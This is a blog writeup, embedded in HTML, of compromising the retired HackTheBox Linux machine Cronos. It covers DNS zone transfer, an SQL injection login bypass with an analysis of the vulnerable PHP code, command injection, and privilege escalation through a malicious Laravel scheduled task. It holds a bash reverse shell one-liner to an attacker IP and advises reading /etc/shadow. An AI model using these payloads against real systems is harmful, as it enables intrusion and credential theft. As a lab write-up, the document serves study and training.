@@ -1,0 +1,909 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HackTheBox - Cronos Writeup w/o Metasploit - Welcome to noobsec</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="HackTheBox - Cronos Writeup w/o Metasploit" />
+<meta property="og:description" content="HackTheBox - Cronos Writeup w/o Metasploit Introduction Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&rsquo;s jump in.
+Reconnaissance General Enumeration We&rsquo;ll start out with an nmap scan. I always start with a quick initial scan. Command:
+nmap -Pn -n -oN nmap/initial 10.10.10.13Output: We can see that from the top 1000 ports only three are open:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/hackthebox/htb-cronos/" /><meta property="article:section" content="hackthebox" />
+<meta property="article:published_time" content="2020-07-07T01:43:22+00:00" />
+<meta property="article:modified_time" content="2020-07-07T01:43:22+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HackTheBox - Cronos Writeup w/o Metasploit"/>
+<meta name="twitter:description" content="HackTheBox - Cronos Writeup w/o Metasploit Introduction Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&rsquo;s jump in.
+Reconnaissance General Enumeration We&rsquo;ll start out with an nmap scan. I always start with a quick initial scan. Command:
+nmap -Pn -n -oN nmap/initial 10.10.10.13Output: We can see that from the top 1000 ports only three are open:"/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#general-enumeration">General Enumeration</a></li>
+        <li><a href="#dns-enumeration">DNS Enumeration</a></li>
+        <li><a href="#web-enumeration">Web Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation---gaining-initial-foothold">Exploitation - Gaining Initial Foothold</a>
+      <ul>
+        <li><a href="#authentication-bypass---sql-injection">Authentication Bypass - SQL Injection</a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+        <li><a href="#getting-a-shell">Getting A Shell</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#extra---beyond-r00t---vulnerability-analysis">Extra - Beyond r00t - Vulnerability Analysis</a>
+      <ul>
+        <li><a href="#authentication-bypass---sql-injection-1">Authentication Bypass - SQL Injection</a></li>
+        <li><a href="#code-injection---remote-code-execution">Code Injection - Remote Code Execution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="hackthebox---cronos-writeup-wo-metasploit">HackTheBox - Cronos Writeup w/o Metasploit</h1>
+<h2 id="introduction">Introduction</h2>
+<p>Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let&rsquo;s jump in.</p>
+<p><img src="/HackTheBox/htb-cronos/0_Cronos.png" alt="Cronos"></p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="general-enumeration">General Enumeration</h3>
+<p>We&rsquo;ll start out with an <code>nmap</code> scan. I always start with a quick initial scan.
+Command:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">nmap -Pn -n -oN nmap/initial 10.10.10.13
+</code></pre>
+<p>Output:
+<img src="/HackTheBox/htb-cronos/1_nmap_initial.png" alt="Intial Nmap Scan Result"></p>
+<p>We can see that from the top 1000 ports only three are open:</p>
+<ul>
+<li>port 22 - SSH</li>
+<li>port 53 - DNS</li>
+<li>port 80 - HTTP</li>
+</ul>
+<p>Let&rsquo;s make some notes!</p>
+<p>Since port 22 is open, this is mostly a Linux machine. Port 53 is a rare port to be open, especially on a TCP side of the network, this indicates that we could perform zone transfer against it. Port 80 is HTTP so there is probably some web based system present.</p>
+<p>Let&rsquo;s perform a targeted scan against these ports found.
+Command:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">nmap -Pn -n -p22,53,80 -sC -sV -oN nmap/targeted 10.10.10.13
+</code></pre>
+<p>Output:</p>
+<p><img src="/HackTheBox/htb-cronos/2_nmap_targeted.png" alt="Nmap Targeted Scan"></p>
+<p>Let&rsquo;s make some more notes! The SSH is OpenSSH 7.2 so I&rsquo;m not going to bother doing anything on that, but we now know that it is potentially Ubuntu Xenial 16.04 LTS machine. We got DNS and HTTP server versions too. From the Apache version, our guess of the OS gets a little more stronger.</p>
+<p>Since the DNS port is open, and we might be dealing with some web-based application, we should enumerate DNS first to get any domain, and subdomain information we can get before starting with HTTP</p>
+<h3 id="dns-enumeration">DNS Enumeration</h3>
+<p>Since we only have an IP address on hand, let&rsquo;s find try to find some nameservers. We can fetch all the DNS records of a domain with it&rsquo;s corresponding IP address but we do need a domain first, which is what this nameserver enumeration will provide us.</p>
+<p><img src="/HackTheBox/htb-cronos/3_nslookup.png" alt="Nslookup"></p>
+<p>Great, we got a nameserver of the corresponding domain! Let&rsquo;s get all the subdomains now</p>
+<p><img src="/HackTheBox/htb-cronos/4_zone_transfer.png" alt="DNS Zone Transfer"></p>
+<p>We got two subdomains of <code>cronos.htb</code>:</p>
+<ul>
+<li>admin.cronos.htb</li>
+<li><a href="https://www.cronos.htb">www.cronos.htb</a></li>
+</ul>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Now with enough information on hand, we can start enumerating HTTP</p>
+<p>Before we start ensure that the subdomains that we found has been added to the <code>/etc/hosts</code> file</p>
+<p><img src="/HackTheBox/htb-cronos/5_adding_subdomains.png" alt="Adding DNS Entries"></p>
+<p>To ensure all our steps could be retraceable, let&rsquo;s enable BurpSuite and ensure it&rsquo;s logging every request. Interception isn&rsquo;t required, just logging of every request you send to the webserver, and other interactions.</p>
+<p>Manually browsing to the <code>cronos.htb</code> reveals that all the links present are external, and nothing interesting in the page source.</p>
+<p>Manually browsing to the <code>admin.cronos.htb</code> reveals a login portal, much more interesting.</p>
+<p><img src="/HackTheBox/htb-cronos/7_admin_login.png" alt="Cronos admin portal"></p>
+<p>The portal is using PHP
+<img src="/HackTheBox/htb-cronos/7_technologies.png" alt="Portal Technologies"></p>
+<p>The page source doesn&rsquo;t provide any extra information. Since I have an admin login portal on hand, I will first try if common credentials would log me in or not before I start performing automated enumeration, such as running gobuster on both the subdomains consecutively.</p>
+<h2 id="exploitation---gaining-initial-foothold">Exploitation - Gaining Initial Foothold</h2>
+<h3 id="authentication-bypass---sql-injection">Authentication Bypass - SQL Injection</h3>
+<p>Upon failed attempts to log into the system with common credentials like &ldquo;admin:admin&rdquo; &ldquo;admin:password&rdquo; &ldquo;admin:password123&rdquo;, I sent the simplest SQL injection payload in the username field, and voilà! We have successfully logged into the portal.</p>
+<p><img src="/HackTheBox/htb-cronos/8_sqli.png" alt="SQL Injcetion"></p>
+<p>If you&rsquo;re wondering why I did that? Or what even made me believe that the SQL injection would work? The answer is quite simple, I don&rsquo;t. The credentials could have been hardcoded, or anything else. The reason why I tried this is because of the sole reason that this is a login portal. Quite often login portal would be using some sort of database system to store users data, and since this portal was using PHP, I decided to give it a try.</p>
+<p><img src="/HackTheBox/htb-cronos/9_logged_in.png" alt="Logged in"></p>
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+<p>Let&rsquo;s check the page source of this page too, before messing around with the custom &ldquo;Net Tool v0.1&rdquo;</p>
+<p><img src="/HackTheBox/htb-cronos/10_page_source.png" alt="Page Source"></p>
+<p>Seems like there&rsquo;s some potential for code injection. Let&rsquo;s test it.</p>
+<p><img src="/HackTheBox/htb-cronos/10_test.png" alt="RCE Test"></p>
+<p>There&rsquo;s no protection against stacking commands using <code>;</code> and we definitely have an RCE on this custom tool, let&rsquo;s do what we do best - exploit it.</p>
+<h3 id="getting-a-shell">Getting A Shell</h3>
+<p>Using the bash one-liner reverse shell to get a shell. I like to stick to port 443 because the reverse shell will not get killed or dropped by the target systems&rsquo; firewall.</p>
+<p>Command:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-bash">; /bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1&quot;
+</code></pre>
+<p><img src="/HackTheBox/htb-cronos/11_getting_a_shell.png" alt="Sending Evil Payload"></p>
+<p>Catching the reverse shell from our listener</p>
+<p><img src="/HackTheBox/htb-cronos/12_shell.png" alt="Getting A Shell"></p>
+<p>We can read user.txt as <code>www-data</code> but let&rsquo;s do that later</p>
+<p><img src="/HackTheBox/htb-cronos/12_user_later.png" alt="user.txt Is Readable"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>I transferred LinEnum.sh to the target machine and executed it, found an interesting cron job</p>
+<p><img src="/HackTheBox/htb-cronos/17_found_cron.png" alt="Laravel Artisan Cron Job"></p>
+<p>If you wanted to find this manually you could do that by this command - <code>cat /etc/cron*</code></p>
+<p><img src="/HackTheBox/htb-cronos/17_cron_manual.png" alt="Find Cron Manually"></p>
+<p>Upon finding a cron job, it is essential to check when it will run. This is to avoid any rabbit holes, it&rsquo;s great to find a root owned cron job, but no use if it runs monthly or quarterly.</p>
+<p><img src="/HackTheBox/htb-cronos/17_understanding_cron.png" alt="Find Cron Manually"></p>
+<p><span style="font-size:small;text-align:center;display:block;">Credit to <a href="https://www.cyberciti.biz/faq/run-crontab-job-every-minute-on-linux-unix-bsd/" target="_blank">nixCraft</a></span></p>
+<p>When a particular field is marked with an asterisk, it indicates that the cron is run at every unit of that field. In our case, the cron is run every minute of every hour of every day of every month! Perfect.</p>
+<p>Now we could either leverage this by overwriting the cron file, but that is a horrible practice and should never become a habit. Doing such in a real life engagement may lead to dire consequences.</p>
+<p>Let&rsquo;s do it the &ldquo;right&rdquo; way by creating a scheduled task in Laravel using <a href="https://laravel.com/docs/7.x/scheduling">their docs</a>. When working with something new, the documentation of the new technology or application is always a good place to look.</p>
+<p>The first thing we see in the docs is a very similar cron job, pasted below.</p>
+<p><img src="/HackTheBox/htb-cronos/21_similar_cron.png" alt="Laravel Cron Job"></p>
+<p>As per the docs we should create schedules in <code>/laravel/app/Console/Kernel</code> class.</p>
+<p><img src="/HackTheBox/htb-cronos/21_defining_schedules.png" alt="Defining Schedules"></p>
+<p>Now that we know where to add scheduled tasks, let&rsquo;s see how to add them.</p>
+<p><img src="/HackTheBox/htb-cronos/21_exec.png" alt="Exec Commands"></p>
+<p>We can modify frequency of our scheduled task too, which runs independently to the cron job.</p>
+<p><img src="/HackTheBox/htb-cronos/22_frequency.png" alt="Schedule Frequency"></p>
+<p>Now that we have all the information we need, let&rsquo;s exploit this!</p>
+<p>I was unable to edit the file in the target system so I transferred it to my local machine. <code>nc</code> is a good tool to use when transferring a single file or some files from the target system to your attacking machine.</p>
+<p><img src="/HackTheBox/htb-cronos/18_transfer_cron.png" alt="Transferring Task Scheduling File"></p>
+<p>Successfully saved the task scheduling file</p>
+<p><img src="/HackTheBox/htb-cronos/19_file_saved.png" alt="File Saved"></p>
+<p>As per the documentation, a malicious task was scheduled to be executed every minute along with the cron job.</p>
+<p><img src="/HackTheBox/htb-cronos/20_scheduled_task.png" alt="Scheduled Task Created"></p>
+<p>It&rsquo;s always a good idea to backup the original file that you&rsquo;ll be manipulating and then performing any actions that you require on it. Backed-up the original <code>Kernel.php</code> file and then transferred the malicious file in it&rsquo;s place.</p>
+<p><img src="/HackTheBox/htb-cronos/23_transferring_malicious.png" alt="Saving The Malicious File"></p>
+<p>Once the file is in place, we wait for a minute with our listener waiting for the reverse shell, and done.
+We are root.</p>
+<p><img src="/HackTheBox/htb-cronos/24_got_root.png" alt="Got r00t"></p>
+<p>Let&rsquo;s go get our loot!</p>
+<p><img src="/HackTheBox/htb-cronos/25_root.png" alt="/root/root.txt"></p>
+<p><img src="/HackTheBox/htb-cronos/26_user.png" alt="/home/noulis/user.txt"></p>
+<p>Always a good idea to get the contents of the <code>/etc/shadow</code> file too</p>
+<p><img src="/HackTheBox/htb-cronos/27_shadow.png" alt="/etc/shadow"></p>
+<h2 id="extra---beyond-r00t---vulnerability-analysis">Extra - Beyond r00t - Vulnerability Analysis</h2>
+<p>This section will cover the vulnerability analysis as well as understanding how the code is working.</p>
+<h3 id="authentication-bypass---sql-injection-1">Authentication Bypass - SQL Injection</h3>
+<p>The following code is from the <code>index.php</code> file that was responsible for handling the login requests for the admin.cronos.htb.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">&lt;?php           
+//ini_set('display_errors', 1);                  
+//ini_set('display_startup_errors', 1);                                                                              
+//error_reporting(E_ALL);                                                                                            
+   include(&quot;config.php&quot;);                                                                                            
+   session_start();          
+                
+   if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {                                                                        
+      // username and password sent from form 
+                               
+      $myusername = $_POST['username'];
+      $mypassword = md5($_POST['password']); 
+                                                          
+      $sql = &quot;SELECT id FROM users WHERE username = '&quot;.$myusername.&quot;' and password = '&quot;.$mypassword.&quot;'&quot;;
+      $result = mysqli_query($db,$sql);
+      $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
+      //$active = $row['active'];                                                                                    
+      $count = mysqli_num_rows($result);                                                                             
+       
+      // If result matched $myusername and $mypassword, table row must be 1 row
+                                                          
+      if($count == 1) {                                                                                                                                                                                                                    
+         //session_register(&quot;myusername&quot;);                
+         $_SESSION['login_user'] = $myusername;
+                           
+         header(&quot;location: welcome.php&quot;);
+      }else {                                   
+         $error = &quot;Your Login Name or Password is invalid&quot;;
+      }  
+   }                                                      
+?&gt;
+</code></pre>
+<p>Let&rsquo;s understand what is piece of code is doing line by line</p>
+<p>On line 5, it includes the database config file <code>config.php</code>
+On line 8, it checks if the login request has issued as a POST request, only if it is the authentication can proceed</p>
+<p>On line 11, the &ldquo;username&rdquo; parameter from the POST request is assigned to a PHP variable <code>$myusername</code>
+On line 12 , an MD5 hash of the &ldquo;password&rdquo; parameter from the POST request is assigned to a PHP variable <code>$mypassword</code></p>
+<p>It is important to note that no escaping or validation of the user input has done before assigning them to the PHP variables.</p>
+<p>On line 14, an SQL statement is created using the above PHP variables.
+The statement that would be passed on to the database server would be as follows:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-PHP">SELECT id FROM users WHERE username = '$myusername' AND password = '$mypassword';
+</code></pre>
+<p>The query retrieves the value of the column &ldquo;id&rdquo; from a row where the &ldquo;username&rdquo; and &ldquo;password&rdquo; matches the credentials sent by the end-user. Uses this &ldquo;id&rdquo; value to log the user in.</p>
+<p>On line 15, a query is performed against the database
+On line 16, the query results are stored</p>
+<p>On line 18, we count the numer of rows that have returned from the query
+On line 22, we check if the number of rows returned are one or not. If yes, we can log into the system as that user.</p>
+<p>On line 26, if we have successfully logged in, we would be redirected to <code>welcome.php</code>
+On line 28, an error is presented to the end-user if the number of rows returned are not equal to 1.</p>
+<p>Now let&rsquo;s talk about the vulnerbility here. The SQL query that is built is dynamic, dependent on the username and password parameters of the POST request.
+Since these parameter&rsquo;s values are taken as-is, trusting the user input, and passed on to the PHP variables which goes on to completing the SQL query which would be executed on the database server, allows the attacker to inject SQL into the existing query.</p>
+<p>On a normal request the query would like follows (considering the end-user send admin : admin as credentials):</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT id FROM users WHERE username = 'admin' AND password = 'admin';
+</code></pre>
+<p>But since there&rsquo;s no escaping and validation of the user input, a malicious actor could send in anything. Let&rsquo;s see what happens to the query with the values (<code>'or'1'='1';-- - : [blank]</code>) we sent as credentials:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT id FROM users WHERE username = ''or'1'='1';-- -' AND password = '';
+</code></pre>
+<p>We append a single-quote to the username field which completes it, then introduce an <code>OR</code> operator to the <code>WHERE</code> condition, with 1=1 check, which would always result true. Next we complete the SQL statement by adding a semi-colon and commenting out the rest of the query as to ensure it does not interfere with our injection.</p>
+<p>This tells the database server that hey send me <code>id</code> from the <code>users</code> table <code>where</code> either the <code>username</code> is nothing <code>or</code> anything. The password check is completely ignored since it&rsquo;s commented out. This results in the database sending all the entries that are present in the users table to the PHP code.</p>
+<p>But since there&rsquo;s a row count check this shouldn&rsquo;t have worked since this would have dumped the entire users table. Only reason this would&rsquo;ve worked is that the table only consists of one entry and is that of the admin user. Let&rsquo;s check.</p>
+<p>We get the database credentials from the <code>config.php</code> file which the <code>index.php</code> loads.</p>
+<p><img src="/HackTheBox/htb-cronos/13_db_creds.png" alt="Database Credentials"></p>
+<p>We check the users table, and indeed the table only has one entry and that of the admin user which is why our payload worked.</p>
+<p><img src="/HackTheBox/htb-cronos/13_db.png" alt="Users Table"></p>
